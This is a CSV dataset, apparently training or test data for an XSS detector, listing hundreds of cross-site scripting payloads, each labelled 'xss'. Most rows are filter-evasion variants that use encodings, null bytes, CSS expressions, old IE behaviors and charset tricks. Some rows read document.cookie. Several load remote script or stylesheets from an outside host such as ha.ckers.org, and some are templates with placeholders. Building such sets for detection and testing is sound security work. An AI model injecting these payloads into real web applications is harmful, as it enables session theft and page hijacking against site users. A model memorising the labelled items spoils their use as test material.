,payload,type
8405,"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
8406,"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
8407,<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,xss
8408,"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
8409,"<object data=""data:text/html;base64,%(base64)s"">",xss
8410,"<embed src=""data:text/html;base64,%(base64)s"">",xss
8411,<b <script>alert(1)</script>0,xss
8412,"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",xss
8413,"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss
8414,"<embed src=""javascript:alert(1)"">",xss
8415,"<img src=""javascript:alert(1)"">",xss
8416,"<image src=""javascript:alert(1)"">",xss
8417,"<script src=""javascript:alert(1)"">",xss
8418,<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,xss
8419,"<? foo=""><script>javascript:alert(1)</script>"">",xss
8420,"<! foo=""><script>javascript:alert(1)</script>"">",xss
8421,"</ foo=""><script>javascript:alert(1)</script>"">",xss
8422,"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
8423,"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",xss
8424,"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
8425,"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",xss
8426,"<img \x00src=x onerror=""alert(1)"">",xss
8427,"<img \x47src=x onerror=""javascript:alert(1)"">",xss
8428,"<img \x11src=x onerror=""javascript:alert(1)"">",xss
8429,"<img \x12src=x onerror=""javascript:alert(1)"">",xss
8430,"<img\x47src=x onerror=""javascript:alert(1)"">",xss
8431,"<img\x10src=x onerror=""javascript:alert(1)"">",xss
8432,"<img\x13src=x onerror=""javascript:alert(1)"">",xss
8433,"<img\x32src=x onerror=""javascript:alert(1)"">",xss
8434,"<img\x47src=x onerror=""javascript:alert(1)"">",xss
8435,"<img\x11src=x onerror=""javascript:alert(1)"">",xss
8436,"<img \x47src=x onerror=""javascript:alert(1)"">",xss
8437,"<img \x34src=x onerror=""javascript:alert(1)"">",xss
8438,"<img \x39src=x onerror=""javascript:alert(1)"">",xss
8439,"<img \x00src=x onerror=""javascript:alert(1)"">",xss
8440,"<img src\x09=x onerror=""javascript:alert(1)"">",xss
8441,"<img src\x10=x onerror=""javascript:alert(1)"">",xss
8442,"<img src\x13=x onerror=""javascript:alert(1)"">",xss
8443,"<img src\x32=x onerror=""javascript:alert(1)"">",xss
8444,"<img src\x12=x onerror=""javascript:alert(1)"">",xss
8445,"<img src\x11=x onerror=""javascript:alert(1)"">",xss
8446,"<img src\x00=x onerror=""javascript:alert(1)"">",xss
8447,"<img src\x47=x onerror=""javascript:alert(1)"">",xss
8448,"<img src=x\x09onerror=""javascript:alert(1)"">",xss
8449,"<img src=x\x10onerror=""javascript:alert(1)"">",xss
8450,"<img src=x\x11onerror=""javascript:alert(1)"">",xss
8451,"<img src=x\x12onerror=""javascript:alert(1)"">",xss
8452,"<img src=x\x13onerror=""javascript:alert(1)"">",xss
8453,"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss
8454,"<img src=x onerror=\x09""javascript:alert(1)"">",xss
8455,"<img src=x onerror=\x10""javascript:alert(1)"">",xss
8456,"<img src=x onerror=\x11""javascript:alert(1)"">",xss
8457,"<img src=x onerror=\x12""javascript:alert(1)"">",xss
8458,"<img src=x onerror=\x32""javascript:alert(1)"">",xss
8459,"<img src=x onerror=\x00""javascript:alert(1)"">",xss
8460,<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,xss
8461,"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
8462,"<img src onerror /"" '""= alt=javascript:alert(1)//"">",xss
8463,<title onpropertychange=javascript:alert(1)></title><title title=>,xss
8464,"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
8465,<!--[if]><script>javascript:alert(1)</script -->,xss
8466,<!--[if<img src=x onerror=javascript:alert(1)//]> -->,xss
8467,"<script src=""/\%(jscript)s""></script>",xss
8468,"<script src=""\\%(jscript)s""></script>",xss
8469,"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
8470,"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
8471,<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
8472,"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",xss
8473,"<style>@import ""data:,*%7bx:expression(javascript:alert(1))%7D"";</style>",xss
8474,"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",xss
8475,<style>*[{}@import'%(css)s?]</style>X,xss
8476,"<div style=""font-family:'foo&#10;;color:red;';"">XXX",xss
8477,"<div style=""font-family:foo}color=red;"">XXX",xss
8478,<// style=x:expression\28javascript:alert(1)\29>,xss
8479,<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
8480,<div style=content:url(%(svg)s)></div>,xss
8481,"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",xss
8482,"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",xss
8483,"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss
8484,"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",xss
8485,"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
8486,"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",xss
8487,"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
8488,<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
8489,"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",xss
8490,"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",xss
8491,"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
8492,"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
8493,"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
8494,X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,xss
8495,1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,xss
8496,1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
8497,<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
8498,1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>,xss
8499,"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
8500,"<x style=""behavior:url(%(sct)s)"">",xss
8501,"<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",xss
8502,"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",xss
8503,"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss
8504,"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",xss
8505,<script>%(payload)s</script>,xss
8506,<script src=%(jscript)s></script>,xss
8507,<script language='javascript' src='%(jscript)s'></script>,xss
8508,<script>javascript:alert(1)</script>,xss
8509,"<IMG SRC=""javascript:javascript:alert(1);"">",xss
8510,<IMG SRC=javascript:javascript:alert(1)>,xss
8511,<IMG SRC=`javascript:javascript:alert(1)`>,xss
8512,<SCRIPT SRC=%(jscript)s?<B>,xss
8513,"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
8514,<BODY ONLOAD=javascript:alert(1)>,xss
8515,<BODY ONLOAD=javascript:javascript:alert(1)>,xss
8516,"<IMG SRC=""jav ascript:javascript:alert(1);"">",xss
8517,"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",xss
8518,"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",xss
8519,<<SCRIPT>%(payload)s//<</SCRIPT>,xss
8520,"<IMG SRC=""javascript:javascript:alert(1)""",xss
8521,<iframe src=%(scriptlet)s <,xss
8522,"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",xss
8523,"<IMG DYNSRC=""javascript:javascript:alert(1)"">",xss
8524,"<IMG LOWSRC=""javascript:javascript:alert(1)"">",xss
8525,"<BGSOUND SRC=""javascript:javascript:alert(1);"">",xss
8526,"<BR SIZE=""&{javascript:alert(1)}"">",xss
8527,"<LAYER SRC=""%(scriptlet)s""></LAYER>",xss
8528,"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",xss
8529,<STYLE>@import'%(css)s';</STYLE>,xss
8530,"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",xss
8531,"<XSS STYLE=""behavior: url(%(htc)s);"">",xss
8532,"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",xss
8533,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",xss
8534,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",xss
8535,"<IFRAME SRC=""javascript:javascript:alert(1);""></IFRAME>",xss
8536,"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss
8537,"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",xss
8538,"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",xss
8539,"<DIV STYLE=""width:expression(javascript:alert(1));"">",xss
8540,"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",xss
8541,"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss
8542,"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",xss
8543,"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
8544,"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",xss
8545,<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->,xss
8546,"<BASE HREF=""javascript:javascript:alert(1);//"">",xss
8547,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>",xss
8548,<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
8549,"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss
8550,"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
8551,"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",xss
8552,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",xss
8553,"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",xss
8554,<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
8555,"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">",xss
8556,<STYLE>@import'%(css)s';</STYLE>,xss
8557,<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>,xss
8558,"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",xss
8559,<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,xss
8560,<style onreadystatechange=javascript:javascript:alert(1);></style>,xss
8561,"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",xss
8562,<embed code=%(scriptlet)s></embed>,xss
8563,<embed code=javascript:javascript:alert(1);></embed>,xss
8564,<embed src=%(jscript)s></embed>,xss
8565,<frameset onload=javascript:javascript:alert(1)></frameset>,xss
8566,<object onerror=javascript:javascript:alert(1)>,xss
8567,"<embed type=""image"" src=%(scriptlet)s></embed>",xss
8568,"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1);"">]]</C><X></xml>",xss
8569,<IMG SRC=&{javascript:alert(1);};>,xss
8570,"<a href=""jav&#65ascript:javascript:alert(1)"">test1</a>",xss
8571,"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",xss
8572,"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",xss
8573,"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",xss
8574,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",xss
8575,"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",xss
8576,"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
8577,"'';!--""<XSS>=&{()}",xss
8578,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
8579,"<IMG SRC=""javascript:alert('XSS');"">",xss
8580,<IMG SRC=javascript:alert('XSS')>,xss
8581,<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
8582,"<IMG SRC=javascript:alert(""XSS"")>",xss
8583,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
8584,"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss
8585,<a onmouseover=alert(document.cookie)>xxs link</a>,xss
8586,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
8587,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
8588,"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
8589,"<IMG SRC= onmouseover=""alert('xxs')"">",xss
8590,"<IMG onmouseover=""alert('xxs')"">",xss
8591,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
8592,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
8593,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
8594,"<IMG SRC=""jav ascript:alert('XSS');"">",xss
8595,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
8596,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
8597,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
8598,"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
8599,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
8600,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
8601,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
8602,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
8603,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
8604,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss
8605,<SCRIPT SRC=//ha.ckers.org/.j>,xss
8606,"<IMG SRC=""javascript:alert('XSS')""",xss
8607,<iframe src=http://ha.ckers.org/scriptlet.html <,xss
8608,"\"";alert('XSS');//",xss
8609,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
8610,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
8611,"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
8612,"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
8613,"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
8614,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
8615,"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
8616,"<IMG SRC=""livescript:[code]"">",xss
8617,<BODY ONLOAD=alert('XSS')>,xss
8618,"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
8619,"<BR SIZE=""&{alert('XSS')}"">",xss
8620,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
8621,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
8622,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
8623,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
8624,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
8625,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
8626,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
8627,"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
8628,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
8629,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
8630,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
8631,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
8632,"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
8633,"<XSS STYLE=""behavior: url(xss.htc);"">",xss
8634,¼script¾alert(¢XSS¢)¼/script¾,xss
8635,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
8636,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
8637,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
8638,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
8639,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
8640,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
8641,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
8642,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
8643,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
8644,"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
